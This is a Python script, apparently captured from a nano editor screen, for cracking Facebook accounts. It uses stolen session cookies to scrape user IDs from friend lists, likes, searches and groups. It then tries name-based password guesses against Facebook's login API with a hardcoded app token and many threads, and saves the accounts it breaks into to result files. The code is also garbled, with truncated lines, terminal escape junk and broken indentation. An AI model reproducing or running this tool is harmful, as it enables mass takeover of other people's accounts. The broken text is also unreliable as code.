#!/usr/bin/ehttps://b-api.facebook.com/methodnv pytho>
# -*- coding: utf-8 -*-
import os,sys,re,time,json,random,requests
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor
os.system("clear")
print ("\033[96mFOLLOW FB GW DULU COKK \033[92m>_<")
time.sleep(3)
os.system("xdg-open https://www.facebook.com/jaikumar>
os.system("clear")
print ("\033[93mTUNGGU BENTAR......")
time.sleep(8)
def clear():
    os.system("clear")
def kata(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./300)
def baner():
    time.sleep(0.1)
    GNU nano 6.3             new              Modified
┌────────────────────────────────────────────────────>
│  Creator  : JAIKUMAR-PARHYAR                       >
│  Github   :  https://github.com/JAIKUMAR/KING.git  >
│  Facebook : Jany Dil                               >
│  Contact  : +933312734753                          >
└────────────────────────────────────────────────────>
""")
def balik():
^[[0;97m[1] Dump ID From Friend^@[0] Exit^@^[[0m^@1^@>
^[[1;37m    ######      ######     ########
^[[1;37m   ##    ##    ##    ##    ##     ##
^[[1;37m   ##          ##          ##     ##
^[[1;37m    ######      ######     ########
^[[1;37m         ##          ##    ##     ##
^[[1;37m   ##    ##    ##    ##    ##     ##
^[[1;37m    ######      ######     ########
^[[1;97m------------------------^[[1;97m------------->
^[[1;31m^[[1;37m Author ^[[1;97m : ^[[1;37m          >
^[[1;31m^[[1;37m GitHub^[[1;97m  : ^[[1;37m          >
^[[1;31m^[[1;37m Version^[[1;97m : ^[[1;37m          >
^[[1;37m------------------------^[[1;37m------------->
    f=input("\033[00m\t[\033[96mEnter To Back\033[00m>
    if f == "":
       os.system("python SSB.py")
    else:
       sys.exit("\033[1;91mexit\033[00m")
def Janydil():
    time.sleep(0.1)
    print("\033[00m[\033[93m1\033[92m] LOGIN")
    print("\033[00m[\033[93m2\033[92m] UPDATE")
    print("\033[00m[\033[93m3\033[92m] EXIT")
    time.sleep(0.1)
    f=input("\n\033[94mPilih No : \033[1;93m")
    if f == "1":
         print("\033[1;94mAMBIL COOKIES DI KIWI BROWS>
         mbasic = 'https://mbasic.facebook.com{}'
         global die,check,result, count
         id = []
         die = 0
         chek = []
         life = []
         count = 0
         check = 0
         result = 0
         def masuk():
             try:
                    cek = open("cookies").read()
             except FileNotFoundError:
                    cek = input("\033[90m> \033[00mCo>
             cek = {"cookie":cek}
             ismi = ses.get(mbasic.format("/me",verif>
             if "mbasic_logout_button" in str(ismi):
                     if "Apa yang Anda pikirkan sekar>
                             with open("cookies","w")>
                                     f.write(cek["coo>
                     else:
                           print("\033[90m> \033[00mC>
                           try:
                                  requests.get(mbasic>
                           except:
                                  pass
                     try:
          ikuti = parser(requests.>
                             ses.get(mbasic.format(ik>
                     except :
                             pass
                     return cek["cookie"]
             else:
                  exit("\033[00m[\033[91m!\033[00m]\0>
         def login(username,password,cek=False):
             global die,check,result,count
             b = "350685531728%7C62f8ce9f74b12f84c123>
             params = {
                     'access_token': b,
                     'format': 'JSON',
                     'sdk_version': '2',
                     'email': username,
                     'locale': 'en_US',
                     'password': password,
                     'sdk': 'ios',
           'generate_session_cookies': '1',
                     'sig': '3f555f99fb61fcd7aa0c44f5>
             }
             api = 'https://b-api.facebook.com/method>
             response = requests.get(api, params=para>
             if 'EAA' in response.text:
                 print(f"\r\033[00m[\033[1;32m✓\033[0>
                 print()
                 result += 1
                 if cek:
                        life.append(username+"|"+pass>
                 else:
                        with open('results-life.txt',>
                                f.write(username + '|>
             elif 'www.facebook.com' in response.json>
                   print(f"\r\033[00m[\033[1;91mx\033>
                   print()
                   check += 1
                   if cek:
                           chek.append(username+"|"+p>
                   else:
                           with open('results-check.t>
                                f.write(username + '|>
                     else:
                   die += 1
             for i in list('\|/-•'):
                            print(f"\r\033[00m[\033[1>
                            time.sleep(0.2)
         def getid(url):
             raw = requests.get(url,cookies=kuki).con>
             getuser = re.findall('middle"><a class=">
             for x in getuser:
                 if 'profile' in x[0]:
                        id.append(x[1] + '|' + re.fin>
                 elif 'friends' in x:
                        continue
                 else:
                        id.append(x[1] + '|' + x[0].s>
                 print('\r\033[90m> \033[1;96m' + str>
             if 'Lihat Teman Lain' in str(raw):
                 getid(mbasic.format(parser(raw,'html>
             return id
         def fromlikes(url):
             try:
                  like = requests.get(url,cookies=kuk>
                  love = re.findall('href="(/ufi.*?)">  
         aws = getlike(mbasic.format(love))
                  return aws
             except:
                  exit("\033[90m> \033[1;91mcant dump>
         def getlike(react):
             like = requests.get(react,cookies=kuki).>
             ids  = re.findall('class="b."><a href="(>
             for user in ids:
                 if 'profile' in user[0]:
                         id.append(user[1] + "|" + re>
                 else:
                         id.append(user[1] + "|" + us>
                 print(f'\r\033[90m \033[1;96m{str(le>
             if 'Lihat Selengkapnya' in str(like):
                 getlike(mbasic.format(parser(like,'h>
             return id
         def bysearch(option):
             search = requests.get(option,cookies=kuk>
             users = re.findall('class="x ch"><a href>
             for user in users:
                  if "profile" in user[0]:
                         id.append(user[1] + "|" + re>
      else:
                         id.append(user[1] + "|" + us>
                  print(f"\r\033[90m> \033[1;96m{str(>
             if "Lihat Hasil Selanjutnya" in str(sear>
                  bysearch(parser(search,'html.parser>
             return id
         def grubid(endpoint):
             grab = requests.get(endpoint,cookies=kuk>
             users = re.findall('a class=".." href="/>
             for user in users:
                 if "profile" in user[0]:
                         id.append(user[1] + "|" + re>
                 else:
                         id.append(user[1] + "|" + us>
                 print(f"\r\033[90m> \033[1;96m{str(l>
             if "Lihat Selengkapnya" in str(grab):
                 grubid(mbasic.format(parser(grab,"ht>
             return id
         if __name__ == '__main__':
               try:
       ses = requests.Session()
                   kukis = masuk()
                   kuki = {'cookie':kukis}
                   clear()
                   baner()
                   kata('\033[94m====================>
                   kata('\033[1;97m[\033[1;93m1\033[1>
                   kata('\033[1;97m[\033[1;93m2\033[1>
                   kata('\033[1;97m[\033[1;93m3\033[1>
                   kata('\033[1;97m[\033[1;93m4\033[1>
                   kata('\033[1;97m[\033[1;93m5\033[1>
                   kata('\033[1;97m[\033[1;93m6\033[1>
                   kata('\033[94m====================>
                   print()
                   tanya = input('\033[90m> \033[1;93>
                   if tanya =="":
                         exit("\033[00m[\033[91m!\033>
                   elif tanya == '1':
                         url = parser(ses.get(mbasic.>
                         username = getid(mbasic.form>
                   elif tanya == '2':
                         username = input("\033[90m> >
                         if username == "":
            exit("\033[00m[\033[>
                         elif 'www.facebook' in usern>
                                 username = username.>
                         elif 'm.facebook.com' in use>
                                 username = username.>
                         username = fromlikes(usernam>
                   elif tanya == '3':
                         knf = input("\033[90m> \033[>
                         username = bysearch(mbasic.f>
                         if len(username) == 0:
                                 exit("\033[90m[\033[>
                   elif tanya == '4':
                         print("\033[90m> \033[00mcan>
                         grab = input("\033[90m> \033>
                         username = grubid(mbasic.for>
                         if len(username) == 0:
                                 exit("\033[00m[\033[>
                   elif tanya == '5':
                         knf = input("\033[90m> \033[>
                         if knf.isdigit():
                                 user = "/profile.php>
                         else:
             user = parser(reques>
                                 username = getid(mba>
                         except TypeError:
                                 exit("\033[00m[\033[>
                   elif tanya == '6':
                         try:
                                 file1 = open("result>
                                 file2 = open("result>
                                 a = file1 + file2
                                 final = a.strip().sp>
                                 final = set(final)
                                 print(f"\033[00m [\0>
                                 with ThreadPoolExecu>
                                         for user in >
                                                 a = >
                                                 ex.s>
                                 os.remove("results-c>
                                 os.remove("results-l>
                                 for x in life:
                                         with open('r>
                                                 f.wr>        
    print("\n\033[00m[\0>
                                 print("\033[90m> \03>
                         except FileNotFoundError:
                                 exit("\033[00m[\033[>
                   else:
                         exit("\033[00m[\033[91m!\033>
                   print()
                   expass = input("\033[90m> \033[00m>
                   with ThreadPoolExecutor(max_worker>
                          for user in username:
                                  users = user.split(>
                                  ss = users[0].split>
                                  for x in ss:
                                          listpass = [
                                                  str>
                                                  str>
                                                  str>
                                                  str>
                                                  ]
                                          listpass.ap>
                                          for passw i>
           if check != 0 or result != 0:
                           time.sleep(0.1)
                           print("\033[1;94m=========>
                           print("\n\033[00m[\033[92m>
                           print("\033[00m[\033[92m✓\>
                           print("\033[00m[\033[91m!\>
                           print("\033[1;94m=========>
                           print("\n\n")

                   else:
                           time.sleep(0.1)
                           print("\033[94m===========>
                           print("\n\033[00m[\033[92m>
                           print("\033[00m[\033[91m!\>
                           print("\033[1;94m=========>
               except (KeyboardInterrupt,EOFError):
                       exit()
               except requests.exceptions.ConnectionE>
                       exit("\033[00m[\033[91m!\033[0>

    elif f == "2":            
             os.system("git pull")
         balik()


    elif f == "3":
         sys.exit("\033[00m[\033[91m!\033[00m]\033[91>

    else:
         balik()


if __name__=="__main__":
     clear()
     baner()
     mbf()
     balik()
     
